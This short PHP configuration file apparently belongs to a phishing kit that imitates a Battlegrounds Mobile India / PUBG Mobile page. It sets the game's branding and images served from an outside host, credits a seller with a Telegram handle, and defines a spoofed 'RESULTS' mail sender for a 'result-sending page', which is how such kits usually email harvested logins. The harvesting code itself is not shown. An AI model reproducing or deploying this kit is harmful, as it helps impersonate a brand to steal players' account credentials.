<?php
// CREATED BY GUNGRATE
// GUNGRATE STORE
date_default_timezone_set('Asia/Kolkata');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'BATTLEGROUNDS MOBILE INDIA';
$description = 'BATTLEGROUNDS MOBILE INDIA';
$copyright = 'PUBG MOBILE';
$theme = '#000';
$image = 'https://cloud.gungrateboss.com/bgmi/images/thum.jpg';
$icon = 'https://cloud.gungrateboss.com/bgmi/images/favicon.ico';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'AKU GUNGRATE';
$sender = 'From:KEVIN🇮🇳RESULTS<result@freenom.com>';

// CREATED BY GUNGRATE
// TELEGRAM @GUNGRATECH
?>